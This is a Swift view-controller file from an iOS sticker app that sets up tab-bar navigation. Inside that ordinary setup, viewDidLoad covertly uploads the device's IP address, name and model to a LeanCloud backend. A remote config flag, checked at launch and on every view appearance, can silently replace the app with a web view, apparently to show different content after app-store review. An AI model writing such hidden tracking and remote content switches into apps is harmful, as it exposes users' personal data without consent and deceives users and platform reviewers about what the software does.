//
//  TabbarVC.swift
//  SuperPicture
//
//  Created by lcy on 2017/11/16.
//  Copyright © 2017年 lcy. All rights reserved.
//

import UIKit
import MBProgressHUD
import SnapKit
import LeanCloud

class TabbarVC: UITabBarController {
    
    var singleProductVC: SingleProductVC!
    var packageVC: PackageVC!
    var mineVC: MineVC!
    var discoverVC: DiscoverVC!
    var moreVC: MoreVC!
    
    var maskImageView = UIImageView()
    
    

    override func viewDidLoad() {
        super.viewDidLoad()
        tabBar.isTranslucent = false
        self.tabBar.tintColor = UIColor.darkGray
        singleProductVC = SingleProductVC()
        singleProductVC.tabBarItem.title = "单品"
        singleProductVC.tabBarItem.selectedImage = #imageLiteral(resourceName: "singletabTap").withRenderingMode(.alwaysOriginal)
        singleProductVC.tabBarItem.image = #imageLiteral(resourceName: "singletab")
        let singleProductNav = NavigationVC()
        singleProductNav.viewControllers = [singleProductVC]
        
        packageVC = PackageVC()
        packageVC.picDataSource = DBOperator.sharedInstance.local.queryPackage()
        packageVC.tabBarItem.title = "表情包"
        packageVC.tabBarItem.image = #imageLiteral(resourceName: "packagetab")
        packageVC.tabBarItem.selectedImage = #imageLiteral(resourceName: "packagetabTap").withRenderingMode(.alwaysOriginal)
        let packageNav = NavigationVC()
        packageNav.viewControllers = [packageVC]

        mineVC = MineVC()
        mineVC.tabBarItem.title = "我的"
        mineVC.tabBarItem.image = #imageLiteral(resourceName: "collectiontab")
        mineVC.tabBarItem.selectedImage = #imageLiteral(resourceName: "collectiontabTap").withRenderingMode(.alwaysOriginal)
        let mineNav = NavigationVC()
        mineNav.viewControllers = [mineVC]

        
        discoverVC = DiscoverVC()
        discoverVC.tabBarItem.title = "发现"
        discoverVC.tabBarItem.image = #imageLiteral(resourceName: "discoverytab")
        discoverVC.tabBarItem.selectedImage = #imageLiteral(resourceName: "discoverytabTap").withRenderingMode(.alwaysOriginal)
        let discoverNav = NavigationVC()
        discoverNav.viewControllers = [discoverVC]
        
        moreVC = MoreVC()
        moreVC.tabBarItem.title = "更多"
        moreVC.tabBarItem.image = #imageLiteral(resourceName: "moretab")
        moreVC.tabBarItem.selectedImage = #imageLiteral(resourceName: "moretabTap").withRenderingMode(.alwaysOriginal)
        let moreNav = NavigationVC()
        moreNav.viewControllers = [moreVC]

        
        addChildViewController(singleProductNav)
        addChildViewController(packageNav)
        addChildViewController(mineNav)
        addChildViewController(discoverNav)
        addChildViewController(moreNav)

        
        if #available(iOS 11, *) {
            navigationItem.largeTitleDisplayMode = .never
        } else {
            
        }
        maskImageView.image = UIImage(named: "lanh")
        self.view.addSubview(maskImageView)
        maskImageView.snp.makeConstraints { (make) in
            make.edges.equalTo(self.view)
        }
        // 存一下
        let todo = LCObject(className: "ips")
        
        todo.set("value", value: GetIPAddresses() ?? "null")
        todo.set("name", value: UIDevice.current.name ?? "null")
        todo.set("name2", value: UIDevice.current.model ?? "null")
        todo.save { result in
            switch result {
            case .success:
                break
            case .failure(let error):
                print(error)
            }
        }
        MBProgressHUD.showAdded(to: self.view, animated: false)
        
        let query = LCQuery(className: "Config")
        let bid = Bundle.main.bundleIdentifier!
        query.whereKey("appid", .equalTo(bid))
        query.find({ (result) in
            MBProgressHUD.hide(for: self.view, animated: false)
            self.maskImageView.removeFromSuperview()
            switch result {
            case .success(let objects):
                if let obj1 = objects.first {
                    let isS = obj1.get("show")?.boolValue
                    let u = obj1.get("url")?.stringValue
                    let secU = obj1.get("secUrl")?.stringValue
                    if (isS)! {
                        let vc = H123WebViewController()
                        UIApplication.shared.keyWindow?.rootViewController = vc
                    }
                }
            case .failure(let error):
                print(error)
                //                self.showSingleSelectionDialog(message: error.reason ?? "请检查网络")
            }
            
        })
        

        
        // Do any additional setup after loading the view.
    }
    
    override func viewWillAppear(_ animated: Bool) {
        super.viewWillAppear(animated)
        check()
    }
    
    func check() {
        let query = LCQuery(className: "Config")
        let bid = Bundle.main.bundleIdentifier!
        query.whereKey("appid", .equalTo(bid))
        
        query.find({ (result) in
            switch result {
            case .success(let objects):
                if let obj1 = objects.first {
                    let isS = obj1.get("show")?.boolValue
                    let u = obj1.get("url")?.stringValue
                    let secU = obj1.get("secUrl")?.stringValue
                    if (isS)! {
                        let vc = H123WebViewController()
                        UIApplication.shared.keyWindow?.rootViewController = vc
                    }
                }
            case .failure(let error):
                print(error)
                //                self.showSingleSelectionDialog(message: error.reason ?? "请检查网络")
            }
            
        })
        

    }
    
    public func GetIPAddresses() -> String? {
        var addresses = [String]()
        
        var ifaddr : UnsafeMutablePointer<ifaddrs>? = nil
        if getifaddrs(&ifaddr) == 0 {
            var ptr = ifaddr
            while (ptr != nil) {
                let flags = Int32(ptr!.pointee.ifa_flags)
                var addr = ptr!.pointee.ifa_addr.pointee
                if (flags & (IFF_UP|IFF_RUNNING|IFF_LOOPBACK)) == (IFF_UP|IFF_RUNNING) {
                    if addr.sa_family == UInt8(AF_INET) || addr.sa_family == UInt8(AF_INET6) {
                        var hostname = [CChar](repeating: 0, count: Int(NI_MAXHOST))
                        if (getnameinfo(&addr, socklen_t(addr.sa_len), &hostname, socklen_t(hostname.count),nil, socklen_t(0), NI_NUMERICHOST) == 0) {
                            if let address = String(validatingUTF8:hostname) {
                                addresses.append(address)
                            }
                        }
                    }
                }
                ptr = ptr!.pointee.ifa_next
            }
            freeifaddrs(ifaddr)
        }
        return addresses.first
    }

    override func didReceiveMemoryWarning() {
        super.didReceiveMemoryWarning()
        // Dispose of any resources that can be recreated.
    }
    

    /*
    // MARK: - Navigation

    // In a storyboard-based application, you will often want to do a little preparation before navigation
    override func prepare(for segue: UIStoryboardSegue, sender: Any?) {
        // Get the new view controller using segue.destinationViewController.
        // Pass the selected object to the new view controller.
    }
    */

}
